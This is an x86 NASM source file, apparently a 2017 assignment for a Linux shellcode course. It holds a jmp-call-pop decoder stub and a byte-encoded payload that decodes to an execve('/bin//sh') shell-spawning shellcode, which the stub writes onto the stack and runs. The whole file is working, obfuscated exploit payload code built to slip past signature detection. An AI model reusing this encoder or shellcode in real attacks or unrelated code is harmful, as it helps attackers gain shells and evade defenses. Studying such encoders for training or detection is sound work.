; File shellcode-decoder.nasm
; Author: Saleh Bin Muhaysin
; SLEA: SLAE-1101
; Date: 25/12/2017

global _start


section .text

_start:
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	jmp short call_decoder
	
decoder:
	pop esi		; this will contain the address of Encoded_code
	mov edi, esp
	sub edi, codelen
	lea ecx, [esp]	; store the beginning of the shellcode in stack
	
decoding:
	
	mov al, byte [esi]	; contain the first part of the byte 
	mov bl, byte [esi +1]	; contain the secont part of the byte 
	
	xor al, 0x01	
	shr bl, 4
	
	
	xor al, bl		; eax = the decoded byte
	
	; if result 0x00 then we got the end of the code
	jz exe_stack
	
	mov byte[edi], al
	add esi, 2
	inc edi
	jmp short decoding

exe_stack:
	sub esp, codelen
	jmp esp
	
call_decoder:
	call decoder
	Encoded_code: db 0x31,0x11,0xc1,0x01,0x51,0x01,0x61,0x81,0x21,0xf1,0x21,0xf1,0x71,0x31,0x61,0x81,0x61,0x81,0x21,0xf1,0x61,0x21,0x61,0x91,0x61,0xe1,0x81,0x91,0xe1,0x31,0x51,0x01,0x81,0x91,0xe1,0x21,0x51,0x31,0x81,0x91,0xe1,0x11,0xb1,0x01,0x01,0xb1,0xc1,0xd1,0x81,0x01,0x01,0x01	; 0x01, 0x01 is the indecator of shellcode end
	; get the length of the original shellcode 
	codelen equ ($-Encoded_code-2) / 2 

	
	
